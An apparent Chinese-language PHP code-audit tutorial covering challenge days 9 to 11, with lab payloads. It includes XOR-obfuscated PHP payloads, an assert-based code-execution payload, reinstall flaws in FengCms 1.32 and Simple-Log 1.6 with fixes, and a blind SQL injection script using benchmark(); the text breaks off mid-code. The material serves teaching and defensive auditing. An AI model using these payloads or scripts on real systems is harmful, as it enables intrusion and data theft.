class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这道题目实际上和上面那道题目差不多，只是过滤了一个下划线 <strong>_</strong> 而已，我们可以用中文来做变量名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$哼=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;$哼();</span><br></pre></td></tr></table></figure><p>当然，我们也可以 <strong>fuzz</strong> 可用的 <strong>ASCII</strong> 做变量名，<strong>fuzz</strong> 代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    asc = <span class="string">&quot;%%%02x&quot;</span> % i</span><br><span class="line">    url = <span class="string">&#x27;http://localhost/demo/index2.php?code=$%s=&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#x27;</span> % (asc,asc)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;HRCTF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s 可用&quot;</span> %asc)</span><br></pre></td></tr></table></figure><p>可以看到此时 <strong>payload</strong> 长度为 <strong>28</strong> 。当然还有其他 <strong>payload</strong> ，例如下面这样的，原理都差不多，大家自行理解。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$呵=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$呵&#125;[呵]($&#123;$呵&#125;[呵]);&amp;呵=getFlag</span><br></pre></td></tr></table></figure><p><a href="https://521-wf.com/archives/45.html">preg_replace的&#x2F;e修饰符妙用与慎用</a><br><a href="https://xz.aliyun.com/t/1290">老洞新姿势，记一次漏洞挖掘和利用(PHPMailer RCE)</a></p><h2 id="Day9-Rabbit"><a href="#Day9-Rabbit" class="headerlink" title="Day9 Rabbit"></a>Day9 Rabbit</h2><p>主要涉及到下面两个函数的缺陷：</p><blockquote><p><a href="http://php.net/manual/zh/function.str-replace.php"> str_replace </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：子字符串替换</p><p><strong>定义</strong> ： <code>mixed str_replace ( mixed $search , mixed $replace , mixed $subject [, int &amp;$count ] )</code> </p><p>该函数返回一个字符串或者数组。如下：</p><p>str_replace(字符串1，字符串2，字符串3)：将字符串3中出现的所有字符串1换成字符串2。</p><p>str_replace(数组1，字符串1，字符串2)：将字符串2中出现的所有数组1中的值，换成字符串1。</p><p>str_replace(数组1，数组2，字符串1)：将字符串1中出现的所有数组1一一对应，替换成数组2的值，多余的替换成空字符串。</p></blockquote><blockquote><p><a href="http://php.net/manual/zh/function.strstr.php"> strstr </a>：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：查找字符串的首次出现</p><p><strong>定义</strong> ： <code>string strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] )</code> </p><p>返回 <code>haystack</code> 字符串从 <code>needle</code> 第一次出现的位置开始到 <code>haystack</code> 结尾的字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;domain = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com&#x27;</span>, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">&gt;<span class="comment">// 上面输出：@gmail.com</span></span><br><span class="line">&gt;user = <span class="title function_ invoke__">strstr</span>(<span class="string">&#x27;hongrisec@gmail.com, &#x27;</span>@<span class="string">&#x27;, true); // 从 PHP 5.3.0 起</span></span><br><span class="line"><span class="string">&gt;// 上面输出：hongrisec</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="Day10-Anticipation"><a href="#Day10-Anticipation" class="headerlink" title="Day10 Anticipation"></a>Day10 Anticipation</h2><p>主要是很多代码在遇到错误后没有正确执行退出的代码，从而带来一些逻辑错误</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$pi</span>) || !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$pi</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">goAway</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">assert</span>(<span class="string">&quot;(int)<span class="subst">$pi</span> == 3&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This is not pi.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;This might be pi.&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞解析</strong> ：<br>这道题目实际上讲的是当检测到攻击时，虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题。程序在 <strong>第一行处</strong> 使用 <strong>extract</strong> 函数，将 <strong>POST</strong> 请求的数据全都注册成变量， <strong>extract</strong> 函数的定义如下：</p><blockquote><p><a href="http://php.net/manual/zh/function.extract.php"> extract </a> ：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：从数组中将变量导入到当前的符号表</p><p><strong>定义</strong> ： <code>int extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] )</code> </p></blockquote><p>该函数实际上就是把数组中的键值对注册成变量,这样我们就可以控制 <strong>第7行</strong> 处的 <strong>pi</strong>  变量。程序对 <strong>pi</strong>  变量进行简单的验证，如果不是数字或者没有设置 <strong>pi</strong>  变量，程序就会执行 <strong>goAway</strong> 方法，即记录错误信息并直接重定向到 <strong>&#x2F;error&#x2F;</strong> 页面。看来程序员这里是对非法的操作进行了一定的处理。但是关键在于，程序在处理完之后，没有立即退出，这样程序又会按照流程执行下去，也就到了 <strong>第11行</strong> 的 <strong>assert</strong> 语句。由于前面 <strong>pi</strong>  变量可以被用户控制，所以在这一行存在远程代码执行漏洞。</p><p>例如我们的payload为：<strong>pi&#x3D;phpinfo()</strong> （这里为POST传递数据），然后程序就会执行这个 <strong>phpinfo</strong> 函数。当然，你在浏览器端可能看不到 <strong>phpinfo</strong> 的页面，但是用 <strong>BurpSuite</strong> ，大家就可以清晰的看到程序执行了 <strong>phpinfo</strong> 函数<br>实际上，这种案例在真实环境下还不少。例如有些CMS通过检查是否存在install.lock文件，从而判断程序是否安装过。如果安装过，就直接将用户重定向到网站首页，却忘记直接退出程序，导致网站重装漏洞的发生。下面我们来看两个真实的案例。</p><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><h4 id="FengCms-1-32-网站重装漏洞"><a href="#FengCms-1-32-网站重装漏洞" class="headerlink" title="FengCms 1.32 网站重装漏洞"></a>FengCms 1.32 网站重装漏洞</h4><p>本次实例分析，我们选取的是 <strong><a href="http://pan.baidu.com/s/1i33gNVR">FengCms 1.32</a></strong> 。对于一个已经安装好的 <strong>FengCms</strong> ，当用户再次访问 <strong>install&#x2F;index.php</strong> 时，就会导致网站重装。我们来具体看下程序的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;系统已安装，请删除相应安装文件, 请手工删除upload目录下的INSTALL文件！&quot;);&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=/&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: <span class="comment">// 安装程序初始化</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: <span class="comment">// 检查系统环境是否符合要求</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: <span class="comment">// 进行数据库信息输入</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step3.php&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: <span class="comment">// 正在安装</span></span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: <span class="comment">// 安装完成</span></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">&quot;/step/step5.php&quot;</span>;</span><br><span class="line">        <span class="variable">$in</span> = <span class="title function_ invoke__">fopen</span>(ROOT_PATH.<span class="string">&#x27;/upload/INSTALL&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$in</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到，如果是第一次安装网站，程序会在 <strong>upload</strong> 目录下生成一个 <strong>INSTALL</strong> 文件，用于表示该网站已经安装过(对应上图 <strong>25-28行</strong> 代码)。当我们再次访问该文件时，程序会先判断 <strong>upload</strong> 目录下是否有 <strong>INSTALL</strong> 文件。如果存在，则弹窗提示你先删除 <strong>INSTALL</strong> 文件才能进行网站重装(对应上图 <strong>1-4行</strong> 代码)。但是这里注意了，网站在弹出告警信息后，并没有退出，而是继续执行，所以我们在不删除 <strong>INSTALL</strong> 文件的情况下，仍可以重装网站。</p><p>比较有趣的是，原本网站网站成功后，程序会自动删除 <strong>upload</strong> 目录下的所有文件，来防止攻击者重装网站，然而这段代码却在注释当中，具体原因不得而知。</p><h4 id="Simple-Log1-6网站重装漏洞"><a href="#Simple-Log1-6网站重装漏洞" class="headerlink" title="Simple-Log1.6网站重装漏洞"></a>Simple-Log1.6网站重装漏洞</h4><p>我们再来看 <strong><a href="http://down.admin5.com/php/42012.html#link">Simple-Log1.6</a></strong> 网站重装的例子。其 <strong>install\index.php</strong> 文件中，对网站安装成功的处理有问题，其代码是在下图 <strong>17-20行</strong> ，程序只是用 <strong>header</strong> 函数将其重定向到网站首页，然而程序还是会继续执行下去。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 检查输入的魔术引号</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_GET</span>     = <span class="keyword">empty</span>(<span class="variable">$_GET</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_GET</span>);</span><br><span class="line">    <span class="variable">$_POST</span>    = <span class="keyword">empty</span>(<span class="variable">$_POST</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_POST</span>);</span><br><span class="line">    <span class="variable">$_COOKIE</span>  = <span class="keyword">empty</span>(<span class="variable">$_COOKIE</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="title function_ invoke__">input_filter</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$setup</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>]) ? <span class="variable">$_POST</span>[<span class="string">&#x27;setup&#x27;</span>] : <span class="string">&#x27;check&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(PBBLOG_ROOT.<span class="string">&#x27;home/data/config.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$install_lock</span> &amp;&amp; <span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;location: ../index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$setup</span> == <span class="string">&#x27;check&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;config&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (<span class="variable">$setup</span> == <span class="string">&#x27;finish&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而且程序的安装逻辑其实是有问题的，安装步骤由 <strong>$setup</strong> 变量控制，而 <strong>$setup</strong> 变量可以被用户完全控制(如上图 <strong>第10行</strong> 代码)，攻击者完全可以控制网站的安装步骤。</p><p>漏洞利用就极其简单了，我们先来看一下 <strong>FengCms</strong> ，我们直接访问 <strong>install&#x2F;index.php</strong> 页面，无视弹出来的警告<br>可以看到程序仍然可以继续安装。</p><p>我们再来看一下 <strong>Simple-Log</strong> 的重装利用：<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-12.png"></p><p>直接post以上数据，即可重装网站数据。</p><p><strong>修复建议</strong></p><p>实际上，要修复这一类型的漏洞，我们只要在正确的地方退出程序即可。拿这次的例题举例，我们只需要在检查到非法操作的时候，直接添加退出函数，即可避免漏洞发生。例如使用 <strong>die</strong> 、 <strong>exit</strong> 等函数都是可以的</p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$string</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="variable">$string</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">stophack</span>(<span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$raw</span> = <span class="variable">$string</span>;</span><br><span class="line">        <span class="variable">$replace</span> = <span class="keyword">array</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;%5C&quot;</span>,<span class="string">&quot;%22&quot;</span>,<span class="string">&quot;%27&quot;</span>,<span class="string">&quot;%2A&quot;</span>,<span class="string">&quot;~&quot;</span>,<span class="string">&quot;insert&quot;</span>,<span class="string">&quot;update&quot;</span>,<span class="string">&quot;delete&quot;</span>,<span class="string">&quot;into&quot;</span>,<span class="string">&quot;load_file&quot;</span>,<span class="string">&quot;outfile&quot;</span>,<span class="string">&quot;sleep&quot;</span>,);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$replace</span>, <span class="string">&quot;HongRi&quot;</span>, <span class="variable">$string</span>);</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$string</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$raw</span>!=<span class="variable">$string</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;Hacking attempt.&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /error/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="title function_ invoke__">stophack</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM students WHERE id=<span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;&#x27;</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row[&#x27;id&#x27;]&#125;</span> | <span class="subst">&#123;$row[&#x27;name&#x27;]&#125;</span>   | <span class="subst">&#123;$row[&#x27;email&#x27;]&#125;</span>   |   <span class="subst">&#123;$row[&#x27;score&#x27;]&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;你所查询的对象id值不能为空！&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;fire&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;day10&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本次题目源于某CMS 0day 漏洞改编。很明显可以看到在上图代码 第29行 处进行了 SQL 语句拼接，然后直接带入数据库查询。而在前一行，其实是有对 GET 方式传来的参数 id 进行过滤的，我们来详细看看过滤函数 stophack 。</p><p>我们可以清楚的看到 stophack 函数存在 过滤不严 和 检测到非法字符未直接退出 两个问题。<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-13.png"><br>程序如果检测到非法字符或单词，都会将其替换成字符串 HongRi ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 HongRi ，所以我们需要绕过这里的黑名单。纵观整个程序，当 SQL 语句执行出错时，并不会将错误信息显示出来，所以此处应为盲注。开发者估计也是考虑到这个问题，便将关键词 sleep 给过滤了，然而这并不能影响攻击者继续使用盲注来获取数据。关于禁用了 sleep 函数的盲注，大家可以直接参考这篇文章：<a href="https://xz.aliyun.com/t/2288">mysql 延时注入新思路</a> 。这里我直接利用 benchmark 函数来获取flag。python程序如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, string, requests</span><br><span class="line"></span><br><span class="line">version_chars = <span class="string">&quot;.-&#123;&#125;_&quot;</span> + string.ascii_letters + string.digits + <span class="string">&#x27;#&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> version_chars:</span><br><span class="line">        payload = <span class="string">&quot;-1 or if(ascii(mid((select flag from flag),%s,1))=%s,benchmark(200000000,7^3^8),0)&quot;</span> % (i,<span class="built_in">ord</span>(char))</span><br><span class="line">        url = <span class="string">&quot;http://localhost/index.php?id=%s&quot;</span> % payload</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span>(flag):</span><br><span class="line">                sys.stdout.write(<span class="string">&quot;\n[+] The flag is： %s&quot;</span> % flag)</span><br><span class="line">                sys.stdout.flush()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url=url, timeout=<span class="number">2.0</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            flag += char</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;\r[-] Try to get flag： %s&quot;</span> % flag)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[-] Something run error!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Day-11-Pumpkin-Pie"><a href="#Day-11-Pumpkin-Pie" class="headerlink" title="Day 11 - Pumpkin Pie"></a>Day 11 - Pumpkin Pie</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cacheFile</span> = <span class="string">&#x27;/tmp/cachefile&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$template</span> = <span class="string">&#x27;&lt;div&gt;Welcome back %s&lt;/div&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">render</span>(<span 